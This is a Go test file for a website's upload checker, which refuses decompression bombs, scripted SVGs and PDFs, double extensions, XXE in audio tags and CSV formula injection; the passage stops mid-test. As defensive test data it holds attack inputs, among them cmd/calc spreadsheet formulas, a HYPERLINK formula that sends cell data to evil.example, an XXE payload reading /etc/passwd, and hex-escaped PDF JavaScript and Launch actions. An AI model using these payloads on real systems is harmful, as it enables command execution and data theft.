// SPDX-FileCopyrightText: 2026 Rashik Adhikari
// SPDX-License-Identifier: Apache-2.0

package media

import (
	"bytes"
	"compress/zlib"
	"encoding/binary"
	"hash/crc32"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/quilzo/quilzo/internal/collection"
	"github.com/quilzo/quilzo/internal/sheet"
)

var now = time.Date(2026, 8, 15, 12, 0, 0, 0, time.UTC)

// png builds a real PNG so the tests exercise the actual decoder rather than a
// hand-written byte slice that only satisfies the signature check.
//
// withPixels false writes a header and a stub data chunk: DecodeConfig reads
// dimensions without allocating pixels, which is both why the bomb check can
// run before anything large is allocated and how a 66-byte file can claim to be
// 30000x30000.
func png(w, h int, withPixels bool) []byte {
	chunk := func(typ string, data []byte) []byte {
		var b bytes.Buffer
		_ = binary.Write(&b, binary.BigEndian, uint32(len(data)))
		body := append([]byte(typ), data...)
		b.Write(body)
		_ = binary.Write(&b, binary.BigEndian, crc32.ChecksumIEEE(body))
		return b.Bytes()
	}
	var ihdr bytes.Buffer
	_ = binary.Write(&ihdr, binary.BigEndian, uint32(w))
	_ = binary.Write(&ihdr, binary.BigEndian, uint32(h))
	ihdr.Write([]byte{8, 2, 0, 0, 0}) // 8-bit truecolour

	var raw bytes.Buffer
	if withPixels {
		for range h {
			raw.WriteByte(0)
			raw.Write(bytes.Repeat([]byte{0, 0, 0}, w))
		}
	} else {
		raw.WriteByte(0)
	}
	var comp bytes.Buffer
	zw := zlib.NewWriter(&comp)
	_, _ = zw.Write(raw.Bytes())
	_ = zw.Close()

	var out bytes.Buffer
	out.Write([]byte{0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A})
	out.Write(chunk("IHDR", ihdr.Bytes()))
	out.Write(chunk("IDAT", comp.Bytes()))
	out.Write(chunk("IEND", nil))
	return out.Bytes()
}

func pdf(extra string) []byte {
	return []byte("%PDF-1.7\n1 0 obj\n<< /Type /Catalog " + extra +
		" >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n")
}

// pdfObjects builds a PDF that keeps an object in an object stream, as
// qpdf --object-streams=generate, Acrobat and pdfTeX write them, with
// dict the start of the stream's own dictionary. The stream is compressed
// when compress is true, and then the object is nowhere in the file as
// written: a stream this short would be stored rather than compressed, so
// the ordinary objects after it give the compressor something to do.
func pdfObjects(t *testing.T, dict, object string, compress bool) []byte {
	t.Helper()
	header := "2 0 "
	data := []byte(header + object + "\n" +
		strings.Repeat("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\n", 20))
	if compress {
		var z bytes.Buffer
		zw := zlib.NewWriter(&z)
		_, _ = zw.Write(data)
		_ = zw.Close()
		data = z.Bytes()
		if bytes.Contains(data, []byte(object)) {
			t.Fatalf("the fixture's object is in the file as written: %q", data)
		}
	}
	return []byte("%PDF-1.7\n5 0 obj\n<< " + dict + " /N 1 /First " +
		strconv.Itoa(len(header)) + " /Length " + strconv.Itoa(len(data)) +
		" >>\nstream\n" + string(data) + "\nendstream\nendobj\n" +
		"trailer\n<< /Root 2 0 R >>\n%%EOF\n")
}

// -- the happy path ----------------------------------------------------------

func TestARealImageIsAcceptedWithItsDimensions(t *testing.T) {
	f, err := Accept("photo.png", png(64, 48, true), now)
	if err != nil {
		t.Fatalf("a valid PNG was refused: %v", err)
	}
	if f.Width != 64 || f.Height != 48 {
		t.Errorf("dimensions read as %dx%d; templates need these to reserve "+
			"space and stop the page reflowing", f.Width, f.Height)
	}
	if f.Kind != Image || f.Format != "png" {
		t.Errorf("classified as %s/%s", f.Kind, f.Format)
	}
	if len(f.ID) != 64 {
		t.Errorf("the id is %d chars; it should be a SHA-256", len(f.ID))
	}
}

// The stored name is the content hash, so the same file uploaded twice is the
// same object. That is deduplication for free and, more importantly, it means
// no caller-supplied string is ever a path.
func TestTheSameBytesAlwaysGetTheSameID(t *testing.T) {
	body := png(8, 8, true)
	a, _ := Accept("one.png", body, now)
	b, _ := Accept("../../etc/passwd", body, now)
	if a.ID != b.ID {
		t.Error("identical bytes produced different ids")
	}
	if strings.Contains(b.ID, "/") || strings.Contains(b.ID, ".") {
		t.Errorf("the id %q is not opaque", b.ID)
	}
}

// -- the bomb ----------------------------------------------------------------

// A file-size limit does not see this: it is 66 bytes on disk and 900 million
// pixels decoded, which is several gigabytes of memory. The pixel count is the
// thing that has to be bounded.
func TestADecompressionBombIsRefusedDespiteBeingTiny(t *testing.T) {
	body := png(30000, 30000, false)
	if len(body) > 1000 {
		t.Fatalf("the fixture is %d bytes; it is meant to be tiny", len(body))
	}
	_, err := Accept("innocent.png", body, now)
	if err == nil {
		t.Fatal("a 900-megapixel image in 66 bytes was accepted")
	}
	if !strings.Contains(err.Error(), "megapixel") {
		t.Errorf("refused, but not for the right reason: %v", err)
	}
	// And an ordinary large photograph must still be accepted.
	if _, err := Accept("big.png", png(4000, 3000, false), now); err != nil {
		t.Errorf("a 12-megapixel image was refused: %v", err)
	}
}

// -- lying about what a file is ----------------------------------------------

// Magic bytes are a hint. The bytes decide, and a file whose extension and
// contents disagree is refused rather than trusted in either direction.
func TestTheExtensionDoesNotDecideWhatAFileIs(t *testing.T) {
	// A PDF wearing a PNG extension must not be accepted as an image.
	f, err := Accept("photo.png", pdf(""), now)
	if err != nil {
		t.Logf("refused outright, which is also fine: %v", err)
		return
	}
	if f.Kind == Image {
		t.Errorf("a PDF named .png was accepted as an image")
	}
	if f.Format != "pdf" {
		t.Errorf("classified as %q rather than by its contents", f.Format)
	}
}

// A file called photo.png that is not a PNG at all is refused, not stored as
// something unknown.
func TestBytesThatMatchNothingAreRefused(t *testing.T) {
	if _, err := Accept("photo.png", []byte("not a png at all"), now); err == nil {
		t.Error("arbitrary bytes with a .png extension were accepted")
	}
}

// RIFF starts both WebP and WAV. Without checking the four bytes at offset 8, a
// WAV would be served as an image and a WebP as audio, decided only by which
// extension was claimed.
func TestRIFFContainersAreDistinguishedByTheirSubtype(t *testing.T) {
	wav := append([]byte("RIFF\x00\x00\x00\x00WAVE"), bytes.Repeat([]byte{0}, 32)...)
	webp := append([]byte("RIFF\x00\x00\x00\x00WEBP"), bytes.Repeat([]byte{0}, 32)...)

	if err := verifyWebP(wav); err == nil {
		t.Error("a WAV passed the WebP check")
	}
	if err := verifyWAV(webp); err == nil {
		t.Error("a WebP passed the WAV check")
	}
	if err := verifyWebP(webp); err != nil {
		t.Errorf("a real WebP header was refused: %v", err)
	}
}

// An MP4 has no fixed prefix: it starts with a size, then "ftyp" at offset 4.
// Checking at offset 0 would validate nothing.
func TestMP4IsCheckedAtTheRightOffset(t *testing.T) {
	good := append([]byte{0, 0, 0, 0x18}, []byte("ftypisom")...)
	good = append(good, bytes.Repeat([]byte{0}, 16)...)
	if err := verifyISOBMFF(good); err != nil {
		t.Errorf("a valid MP4 header was refused: %v", err)
	}
	if err := verifyISOBMFF([]byte("ftypisom0000000000000000")); err == nil {
		t.Error("ftyp at offset 0 was accepted; it belongs at offset 4")
	}
	if err := verifyISOBMFF(append([]byte{0, 0, 0, 0x18},
		[]byte("ftypEVIL00000000")...)); err == nil {
		t.Error("an unrecognised brand was accepted")
	}
}

// -- formats that are refused on principle -----------------------------------

// SVG is the one people argue about, so the refusal has to explain itself well
// enough that the argument does not happen twice.
func TestSVGIsRefusedWithAReason(t *testing.T) {
	svg := []byte(`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`)
	_, err := Accept("logo.svg", svg, now)
	if err == nil {
		t.Fatal("an SVG containing a script element was accepted")
	}
	for _, want := range []string{"script", "PNG"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the refusal does not mention %q: %v", want, err)
		}
	}
}

func TestExecutableAndArchiveFormatsAreRefused(t *testing.T) {
	for _, name := range []string{
		"shell.php", "page.html", "app.js", "lib.wasm", "backup.zip",
		"theme.tar.gz", "report.docx", "sheet.xlsx", "run.exe", "x.jar",
	} {
		if _, err := Accept(name, []byte("MZ\x90\x00 whatever"), now); err == nil {
			t.Errorf("%s was accepted", name)
		}
	}
}

// A double extension is dangerous on a server configured to dispatch on any
// segment, so every segment is checked rather than only the last.
func TestEveryExtensionSegmentIsChecked(t *testing.T) {
	for _, name := range []string{
		"shell.php.png", "x.phtml.jpg", "a.jsp.gif", "evil.exe.pdf",
	} {
		if _, err := Accept(name, png(4, 4, true), now); err == nil {
			t.Errorf("%s was accepted despite a dangerous inner extension", name)
		}
	}
}

// -- PDF ---------------------------------------------------------------------

// A document being published on a website should not do anything when opened.
func TestAPDFThatActsIsRefused(t *testing.T) {
	for _, construct := range []string{
		"/JavaScript (app.alert\\(1\\))",
		"/JS (x)",
		"/OpenAction << /S /JavaScript >>",
		"/Launch << /F (calc.exe) >>",
		"/EmbeddedFile 2 0 R",
		"/AA << /O << /S /JavaScript >> >>",
		"/XFA 3 0 R",
	} {
		if _, err := Accept("report.pdf", pdf(construct), now); err == nil {
			t.Errorf("a PDF containing %s was accepted", construct)
		}
	}
	if _, err := Accept("report.pdf", pdf("/Pages 2 0 R"), now); err != nil {
		t.Errorf("an ordinary PDF was refused: %v", err)
	}
}

// A name is the same name however it is spelled. PDF lets any character
// of one be written as # and two hex digits, and every viewer reads
// /J#61vaScript as /JavaScript. The check was a byte search for the plain
// spelling, so each construct it refuses went through written that way.
func TestAPDFThatActsIsRefusedHoweverItsNamesAreSpelled(t *testing.T) {
	for _, construct := range []string{
		"/J#61vaScript (app.alert\\(1\\))",
		"/#4a#53 (x)",
		"/Open#41ction 3 0 R",
		"/L#61unch << /F (calc.exe) >>",
		"/Embedded#46ile 2 0 R",
		"/#41#41 << /O 3 0 R >>",
		"/XF#41 3 0 R",
		"/RichMedi#61 3 0 R",
	} {
		if _, err := Accept("report.pdf", pdf(construct), now); err == nil {
			t.Errorf("a PDF containing %s was accepted", construct)
		}
	}
	// Control: an ordinary name spelled the same way is an ordinary name.
	if _, err := Accept("report.pdf", pdf("/Pages 2 0 R /#50age#4Cayout /SinglePage"), now); err != nil {
		t.Errorf("an ordinary PDF with an escaped name was refused: %v", err)
	}
}

// A name is refused as itself, not as the start of a longer one, and a
// document that opens at a page does nothing by it. ReportLab names a
// font's subset AAAAAA+, which is not /AA, and LibreOffice gives the page
// a document opens at as an /OpenAction destination, which runs nothing
// (TestAPaperThatOpensAtAPageIsTaken has the way pdfLaTeX gives it). The
// byte search refused both; once object streams are read as well, it
// would have refused every document written with them that did either.
func TestAPDFIsRefusedForWhatItDoesNotForTheLettersOfAName(t *testing.T) {
	for _, ordinary := range []string{
		"/OpenAction [2 0 R /XYZ null null 0]",
		"/OpenAction[2 0 R/Fit]",
		"/Font << /F1 << /BaseFont /AAAAAA+DejaVuSans >> >>",
		"/Names << /JSX 3 0 R >>",
	} {
		if _, err := Accept("report.pdf", pdf(ordinary), now); err != nil {
			t.Errorf("a PDF containing %s was refused: %v", ordinary, err)
		}
		if _, err := Accept("report.pdf", pdfObjects(t, "/Type /ObjStm /Filter /FlateDecode",
			"<< /Type /Catalog "+ordinary+" >>", true), now); err != nil {
			t.Errorf("a PDF containing %s in an object stream was refused: %v", ordinary, err)
		}
	}
	// What each of those is not.
	for _, acts := range []string{
		"/OpenAction 3 0 R",
		"/OpenAction<</S/GoToR/F(x.pdf)>>",
		"/AA<</O 3 0 R>>",
		"/Names << /EmbeddedFiles 3 0 R >>",
		"/S /RichMediaExecute",
	} {
		if _, err := Accept("report.pdf", pdf(acts), now); err == nil {
			t.Errorf("a PDF containing %s was accepted", acts)
		}
	}
}

// What a viewer finds inside an object stream it obeys as it would
// anywhere else, and a PDF written since version 1.5 may keep all its
// dictionaries in one, compressed. The byte search saw only the compressed
// bytes, so a catalog with an /OpenAction, or a JavaScript action, went
// through as soon as it was written the way qpdf, Acrobat and pdfTeX write
// objects.
//
// One that cannot be read is refused rather than taken on trust: what it
// holds cannot be checked, and a stream encoded some other way, or with
// decoding parameters, or encrypted, is how the next file would hide it.
func TestAPDFThatActsInsideAnObjectStreamIsRefused(t *testing.T) {
	for name, f := range map[string][]byte{
		"an action when opened": pdfObjects(t, "/Type /ObjStm /Filter /FlateDecode",
			"<< /Type /Catalog /OpenAction 3 0 R >>", true),
		"JavaScript": pdfObjects(t, "/Type /ObjStm /Filter /FlateDecode",
			"<< /S /JavaScript /JS (app.alert\\(1\\)) >>", true),
		"its dictionary's names escaped": pdfObjects(t, "/Type /Obj#53tm /Filter /Fl#61teDecode",
			"<< /S /Launch /F (calc.exe) >>", true),
		"no type, as a viewer that reads /First takes it": pdfObjects(t, "/Filter [ /Fl ]",
			"<< /Names << /EmbeddedFiles 3 0 R >> >>", true),
		"the name inside escaped": pdfObjects(t, "/Type /ObjStm /Filter /FlateDecode",
			"<< /Type /Catalog /Open#41ction 3 0 R >>", true),
		"uncompressed": pdfObjects(t, "/Type /ObjStm",
			"<< /Type /Catalog /OpenAction 3 0 R >>", false),
	} {
		if _, err := Accept("report.pdf", f, now); err == nil {
			t.Errorf("a PDF with %s in an object stream was accepted", name)
		}
	}
	for name, f := range map[string][]byte{
		"another encoding": pdfObjects(t, "/Type /ObjStm /Filter /ASCIIHexDecode",
			"<< /Type /Pages /Kids [] /Count 0 >>", false),
		"decoding parameters": pdfObjects(t, "/Type /ObjStm /Filter /FlateDecode /DecodeParms << /Predictor 12 /Columns 4 >>",
			"<< /Type /Pages /Kids [] /Count 0 >>", true),
		"its filter elsewhere": pdfObjects(t, "/Type /ObjStm /Filter 7 0 R",
			"<< /Type /Pages /Kids [] /Count 0 >>", true),
		"damaged or encrypted data": pdfObjects(t, "/Type /ObjStm /Filter /FlateDecode",
			"<< /Type /Pages /Kids [] /Count 0 >>", false),
	} {
		if _, err := Accept("report.pdf", f, now); err == nil {
			t.Errorf("a PDF with an object stream in %s, which cannot be read, was accepted", name)
		}
	}

	// Control: an ordinary document written with object streams is taken,
	// and so is an image whose stream is encoded in a way this does not
	// read, since it holds no objects.
	for name, f := range map[string][]byte{
		"compressed":          pdfObjects(t, "/Type /ObjStm /Filter /FlateDecode", "<< /Type /Pages /Kids [] /Count 0 >>", true),
		"in a filter list":    pdfObjects(t, "/Type /ObjStm /Filter [/FlateDecode]", "<< /Type /Pages /Kids [] /Count 0 >>", true),
		"uncompressed":        pdfObjects(t, "/Type /ObjStm", "<< /Type /Pages /Kids [] /Count 0 >>", false),
		"beside a JPEG image": []byte("%PDF-1.7\n4 0 obj\n<< /Type /XObject /Subtype /Image /Width 1 /Height 1 /Filter /DCTDecode /Length 4 >>\nstream\n\xff\xd8\xff\xd9\nendstream\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n"),
	} {
		if _, err := Accept("report.pdf", f, now); err != nil {
			t.Errorf("an ordinary PDF %s was refused: %v", name, err)
		}
	}
}

// pdfNumbered builds a PDF of objects numbered from 1: kept in one object
// stream, compressed, when stream is true, as pdfTeX keeps them, and
// written out one by one otherwise. more is written after them, as an
// update to a file appends objects. As in pdfObjects, what follows the
// objects in the stream gives the compressor something to do.
func pdfNumbered(t *testing.T, stream bool, more string, objects ...string) []byte {
	t.Helper()
	var f strings.Builder
	f.WriteString("%PDF-1.5\n")
	if !stream {
		for i, o := range objects {
			f.WriteString(strconv.Itoa(i+1) + " 0 obj\n" + o + "\nendobj\n")
		}
	} else {
		var header, body strings.Builder
		for i, o := range objects {
			header.WriteString(strconv.Itoa(i+1) + " " + strconv.Itoa(body.Len()) + " ")
			body.WriteString(o + "\n")
		}
		var z bytes.Buffer
		zw := zlib.NewWriter(&z)
		_, _ = zw.Write([]byte(header.String() + body.String() +
			strings.Repeat("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\n", 20)))
		_ = zw.Close()
		if bytes.Contains(z.Bytes(), []byte("/OpenAction")) {
			t.Fatalf("the fixture's catalog is in the file as written: %q", z.Bytes())
		}
		f.WriteString(strconv.Itoa(len(objects)+1) + " 0 obj\n<< /Type /ObjStm /N " +
			strconv.Itoa(len(objects)) + " /First " + strconv.Itoa(header.Len()) +
			" /Filter /FlateDecode /Length " + strconv.Itoa(z.Len()) + " >>\nstream\n" +
			z.String() + "\nendstream\nendobj\n")
	}
	f.WriteString(more + "trailer\n<< /Root 1 0 R >>\n%%EOF\n")
	return []byte(f.String())
}

// A paper opens at its first page by an action that goes there, and that
// is all it does. pdfLaTeX and LuaLaTeX write the page hyperref opens a
// paper at as /OpenAction 4 0 R, object 4 being << /S /GoTo /D [...] >>,
// and keep both in an object stream. The check let through only an
// /OpenAction written as a destination array, so once it read object
// streams it refused every paper written that way with hyperref, which it
// had taken when it could not see inside them.
//
// An action that goes anywhere else, does something more after going
// there, or cannot be found to be sure of, is still refused.
func TestAPaperThatOpensAtAPageIsTaken(t *testing.T) {
	catalog := "<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R /PageMode /UseOutlines >>"
	pages := "<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
	page := "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>"
	goTo := "<< /S /GoTo /D [3 0 R /Fit] >>"
	for name, f := range map[string][]byte{
		"in an object stream, as pdfTeX writes it": pdfNumbered(t, true, "", catalog, pages, page, goTo),
		"written out, as pdfTeX writes a PDF 1.4":  pdfNumbered(t, false, "", catalog, pages, page, "<</D[3 0 R/Fit]/S/GoTo>>"),
		"its names escaped":                        pdfNumbered(t, true, "", catalog, pages, page, "<< /S /Go#54o /D [3 0 R /Fit] >>"),
		"going to a destination kept on its own":   pdfNumbered(t, true, "", catalog, pages, page, "[3 0 R /XYZ null null 0]"),
		"with the action in the catalog": pdfNumbered(t, true, "",
			"<< /Type /Catalog /Pages 2 0 R /OpenAction << /Type /Action /S /GoTo /D [3 0 R /Fit] >> >>", pages, page),
	} {
		if _, err := Accept("paper.pdf", f, now); err != nil {
			t.Errorf("a paper that opens at a page, %s, was refused: %v", name, err)
		}
	}

	for name, f := range map[string][]byte{
		"a web address": pdfNumbered(t, true, "", catalog, pages, page,
			"<< /S /URI /URI (https://tracker.example/opened) >>"),
		"another file": pdfNumbered(t, true, "", catalog, pages, page,
			"<< /S /GoToR /F (\\\\\\\\files.example\\\\share\\\\x.pdf) /D [0 /Fit] >>"),
		"going there and then doing more": pdfNumbered(t, true, "", catalog, pages, page,
			"<< /S /GoTo /D [3 0 R /Fit] /Next 5 0 R >>", "<< /S /URI /URI (https://tracker.example/) >>"),
		"going there and then doing more, in the catalog": pdfNumbered(t, true, "",
			"<< /Type /Catalog /OpenAction << /S /GoTo /D [3 0 R /Fit] /Next << /S /URI /URI (https://x.example/) >> >> >>"),
		"an object that is not there": pdfNumbered(t, true, "",
			"<< /Type /Catalog /Pages 2 0 R /OpenAction 9 0 R >>", pages, page),
		"an object written twice, once as something else": pdfNumbered(t, true,
			"4 0 obj\n<< /S /URI /URI (https://tracker.example/) >>\nendobj\n", catalog, pages, page, goTo),
		"an end of the object inside a string": pdfNumbered(t, false, "", catalog, pages, page,
			"<< /S /GoTo /D [3 0 R /Fit] /X (endobj) /S /URI /URI (https://tracker.example/) >>"),
		"an object in a stream whose objects cannot be told apart": []byte("%PDF-1.5\n1 0 obj\n" + catalog +
			"\nendobj\n5 0 obj\n<< /Type /ObjStm /N 1 /First 6 0 R >>\nstream\n4 0 << /S /URI /URI (https://tracker.example/) >>\nendstream\nendobj\n" +
			"6 0 obj\n4\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n"),
	} {
		if _, err := Accept("paper.pdf", f, now); err == nil {
			t.Errorf("a PDF that opens with %s was accepted", name)
		}
	}
}

func TestATruncatedPDFIsRefused(t *testing.T) {
	if _, err := Accept("x.pdf", []byte("%PDF-1.7\nsome content but no marker"),
		now); err == nil {
		t.Error("a PDF with no end-of-file marker was accepted")
	}
}

// -- the WordPress bug -------------------------------------------------------

// CVE-2021-29447 was XXE reached through WordPress parsing ID3 tags on an
// uploaded audio file. Nothing here parses the tag — but a tag carrying a
// DOCTYPE is a file built to be parsed by something that does, and passing it
// on is how the next tool inherits the bug.
func TestAnAudioFileCarryingXMLInItsTagIsRefused(t *testing.T) {
	payload := append([]byte("ID3\x04\x00\x00\x00\x00\x00\x00"),
		[]byte(`<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>`)...)
	_, err := Accept("song.mp3", payload, now)
	if err == nil {
		t.Fatal("an MP3 with an XXE payload in its ID3 tag was accepted")
	}
	if !strings.Contains(err.Error(), "CVE-2021-29447") {
		t.Errorf("the refusal does not say what this is: %v", err)
	}
	// A normal tagged MP3 must still pass.
	ok := append([]byte("ID3\x04\x00\x00\x00\x00\x00\x00TIT2"),
		bytes.Repeat([]byte{0x20}, 64)...)
	if err := verifyMP3(ok); err != nil {
		t.Errorf("an ordinary tagged MP3 was refused: %v", err)
	}
}

// -- CSV ---------------------------------------------------------------------

// The file is harmless where it sits and dangerous where it lands, which is the
// case people forget.
func TestCSVFormulaInjectionIsRefused(t *testing.T) {
	for _, body := range []string{
		"name,note\nalice,=cmd|'/c calc'!A1\n",
		"a,b\n1,+1+1\n",
		"a,b\n1,@SUM(1:2)\n",
		"a,b\n1,\"=HYPERLINK(\"\"http://evil\"\")\"\n",
	} {
		if _, err := Accept("data.csv", []byte(body), now); err == nil {
			t.Errorf("a CSV containing a formula was accepted: %q", body)
		}
	}
	if _, err := Accept("data.csv", []byte("name,note\nalice,hello\n"), now); err != nil {
		t.Errorf("an ordinary CSV was refused: %v", err)
	}
}

// -- filenames ---------------------------------------------------------------

// The display name is kept for humans and is never a path, but it still gets
// into a Content-Disposition header and onto a screen, so the characters that
// lie or split have to go.
func TestDisplayNamesLoseWhatCanLieOrSplit(t *testing.T) {
	cases := map[string]string{
		"../../etc/passwd":        "passwd",
		"..\\..\\windows\\sys":    "sys",
		"photo.png\x00.php":       "photo.png.php",
		"head\r\nX-Evil: yes.png": "headX-Evil: yes.png",
		"invoice‮gnp.exe.png":     "invoicegnp.exe.png",
		"  spaced.png  ":          "spaced.png",
	}
	for in, want := range cases {
		if got := displayName(in); got != want {
			t.Errorf("displayName(%q) = %q, wanted %q", in, got, want)
		}
	}
	if displayName("\x00\x00") != "unnamed" {
		t.Error("a name made only of control characters should become 'unnamed'")
	}
}

// The download name is rebuilt from the id and the format's own extension
// rather than sanitised from the caller's string, because sanitising is a
// blocklist and blocklists lose.
func TestDownloadNamesAreBuiltNotCleaned(t *testing.T) {
	f, err := Accept("../../evil\"; filename=\"x.png", png(4, 4, true), now)
	if err != nil {
		t.Fatal(err)
	}
	name := f.DownloadName()
	for _, bad := range []string{"..", "/", "\\", "\"", ";", " "} {
		if strings.Contains(name, bad) {
			t.Errorf("the download name %q contains %q", name, bad)
		}
	}
	if !strings.HasSuffix(name, ".png") {
		t.Errorf("the download name %q does not carry the real format", name)
	}
}

// -- serving decisions -------------------------------------------------------

// What may render in the site's origin, and what has to be a download.
//
// This used to say images and nothing else, on the grounds that a format with
// an unaudited parser must not become a page. Two things were wrong with using
// Content-Disposition to enforce that.
//
// It does not enforce it. A browser ignores Content-Disposition on a media
// subresource: <video src> and <audio src> load and decode the file whatever
// this header says. So the parser was reached either way and the header bought
// nothing.
//
// And this program ships a video section kind whose entire job is to put a file
// from this origin into a page. Marking those files as attachments meant the
// documented feature worked by accident, and a reader following a direct link
// to one got a download named after its hash.
//
// So the rule is by what handles the bytes. An image, an audio file or a video
// goes to a media decoder, and every one of them is decoded here before it is
// stored. A PDF goes to a viewer with a scripting engine attached, and text in
// the site's own origin is a page nobody wrote; both stay downloads.
//
// A caption is the fourth. It goes to the browser's WebVTT parser, which is
// not a scripting engine, and it is checked here first — verifyVTT refuses
// every tag a browser would execute or fetch from, for the same reason SVG is
// refused outright. And it has to be inline for the same reason a video does:
// a <track> element fetches it as a subresource, so a download is not a
// caption, it is a feature that does not work.
func TestOnlyMediaRendersInline(t *testing.T) {
	inline := map[string]bool{}
	for name, fm := range formats {
		if !fm.Inline {
			continue
		}
		inline[name] = true
		switch fm.Kind {
		case Image, Audio, Video, Caption:
			// Handed to a decoder or a parser that is not a scripting engine,
			// and checked here before storage.
		default:
			t.Errorf("%s is served inline and is a %s; only media may render "+
				"in this origin", name, fm.Kind)
		}
	}
	for _, want := range []string{"png", "jpeg", "mp4", "webm", "mp3", "vtt"} {
		if !inline[want] {
			t.Errorf("%s should render in a page: a section kind puts one "+
				"there, and a download instead is a feature that does not work",
				want)
		}
	}
	for _, no := range []string{"pdf", "txt", "md", "csv"} {
		if inline[no] {
			t.Errorf("%s must be a download: it is not handed to a media "+
				"decoder, and in this origin it is a page nobody wrote", no)
		}
	}
}

// The MIME type comes from the table, never from the upload. A caller-supplied
// Content-Type is a request, not a fact.
func TestTheServedTypeComesFromTheFormatTable(t *testing.T) {
	f, err := Accept("photo.png", png(4, 4, true), now)
	if err != nil {
		t.Fatal(err)
	}
	if f.MIME() != "image/png" {
		t.Errorf("served as %q", f.MIME())
	}
	// An unknown format must fall back to something inert, not to a guess.
	unknown := File{Format: "not-a-format"}
	if unknown.MIME() != "application/octet-stream" {
		t.Errorf("an unknown format is served as %q", unknown.MIME())
	}
}

// -- the refusal list itself -------------------------------------------------

// "Unsupported file type" sends people looking for a converter that produces
// the same risk under a different extension.
func TestEveryRefusalExplainsItself(t *testing.T) {
	if len(refused) < 20 {
		t.Errorf("only %d refused extensions", len(refused))
	}
	// Resolved, not raw: the table says "See php." to stay readable, but a
	// person shown that has been told nothing, so WhyRefused follows the
	// reference. This asserts the resolution actually happens.
	for ext := range refused {
		why := WhyRefused(ext)
		if len(why) < 30 {
			t.Errorf("%s is refused with %q, which explains nothing to whoever "+
				"pasted the file", ext, why)
		}
		if strings.HasPrefix(why, "See ") {
			t.Errorf("%s returns an unresolved cross-reference: %q", ext, why)
		}
	}
	// The ones that matter most, named so removing them fails here.
	for _, ext := range []string{"svg", "html", "js", "php", "zip", "docx"} {
		if refused[ext] == "" {
			t.Errorf("%s is not on the refusal list", ext)
		}
	}
	// And nothing may be both accepted and refused.
	for ext := range refused {
		if _, ok := formats[ext]; ok {
			t.Errorf("%s is both accepted and refused", ext)
		}
	}
}

func TestEveryAcceptedFormatHasBoundsAndAVerifier(t *testing.T) {
	for name, fm := range formats {
		if fm.MaxBytes <= 0 {
			t.Errorf("%s has no size limit", name)
		}
		if fm.Verify == nil {
			t.Errorf("%s has no verifier, so only its signature is checked", name)
		}
		if fm.MIME == "" || fm.Kind == "" {
			t.Errorf("%s is missing its MIME type or kind", name)
		}
	}
}

// A carriage return ends a line as a line feed does, because a spreadsheet
// reads one as the end of a row: the classic Mac form of the file, with
// nothing but carriage returns, is one every spreadsheet still opens.
//
// The check read lines only at a line feed, so in that form the whole file
// was one line, and a formula at the start of every row but the first was
// in the middle of a cell beginning with the last row's last value. A file
// a visitor attached to a form, with a formula in any of those places, was
// accepted, and ran when the site's owner opened it.
func TestAFormulaAfterACarriageReturnIsRefused(t *testing.T) {
	formula := `=HYPERLINK("http://evil.example/?"&B2)`
	for name, body := range map[string]string{
		"at the start of a row":          "a,b\r" + formula + ",2\r",
		"after a separator":              "a,b\r1," + formula + "\r",
		"after a semicolon":              "a;b\r1;" + formula + "\r",
		"in a quoted cell":               "a,b\r\"" + formula + "\",2\r",
		"after a carriage return in one": "a,b\r\n1,x\r" + formula + "\r\n",
	} {
		if _, err := Accept("data.csv", []byte(body), now); err == nil {
			t.Errorf("a CSV with a formula %s, in rows ended by carriage returns, was accepted", name)
		}
	}
	// Control: the same file without a formula is taken, in either form.
	for _, body := range []string{"name,balance\rAda,-4.5\rGrace,12\r", "name,balance\r\nAda,-4.5\r\n"} {
		if _, err := Accept("data.csv", []byte(body), now); err != nil {
			t.Errorf("an ordinary CSV was refused: %v\n%q", err, body)
		}
	}
}

// The upload check refuses every cell the exports would guard, and takes
// a file the records export wrote.
//
// It stripped tabs before it looked, so its branch for a cell that starts
// with one could never be reached; it let through a cell beginning with a
// minus, which is the classic -2+3+cmd|' /C calc'!A0; and it read the
// carriage return that ends each line of a Windows file as a cell starting
// with one, so an export of records whose last column was empty was
// refused as smuggling a formula.
func TestTheUploadCheckRefusesEveryCellTheExportWouldGuard(t *testing.T) {
	quote := func(v string) string { return `"` + strings.ReplaceAll(v, `"`, `""`) + `"` }
	for _, v := range []string{"\tplain", "-2+3+cmd|' /C calc'!A0", "-cmd", "=1+1", "+1+1", "@SUM(A1)"} {
		if _, err := Accept("data.csv", []byte("a,b\n1,"+quote(v)+"\n"), now); err == nil {
			t.Errorf("a CSV with the cell %q was accepted, and every export guards it", v)
		}
	}
	recs := []collection.Record{
		{ID: "a", Created: 1, Fields: map[string]any{"name": "Ada", "balance": -4.5, "note": ""}},
		{ID: "b", Created: 2, Fields: map[string]any{"name": "Grace", "balance": 12.0}},
	}
	body := sheet.Write(nil, recs, sheet.WriteOptions{})
	if !bytes.Contains(body, []byte(",\r\n")) {
		t.Fatalf("control: the export has no empty last cell:\n%q", body)
	}
	if _, err := Accept("records.csv", body, now); err != nil {
		t.Errorf("a file the records export wrote was refused: %v\n%q", err, body)
	}
}

// A formula is refused wherever in the file a spreadsheet would read it as
// one: in the first cell after the byte-order mark, past the five
// thousandth line, and in a cell a semicolon or a tab begins.
//
// The check looked only at cells a comma begins, in the first 5,001 lines,
// with a byte-order mark read as part of the first cell. A spreadsheet
// takes the mark off before it reads the file, finds the separator for
// itself (Sheets and LibreOffice by looking, Excel by the list separator
// of its country, which is a semicolon across much of Europe), and reads
// every line. So a file a visitor attached to a form, with a formula in
// any of those places, was accepted, and ran when the site's owner opened
// it.
func TestTheUploadCheckFindsAFormulaWhereverASpreadsheetWouldRunIt(t *testing.T) {
	formula := `=HYPERLINK("http://evil.example/?"&B2)`
	for name, body := range map[string]string{
		"after the byte-order mark": "\ufeff" + formula + ",b\n1,2\n",
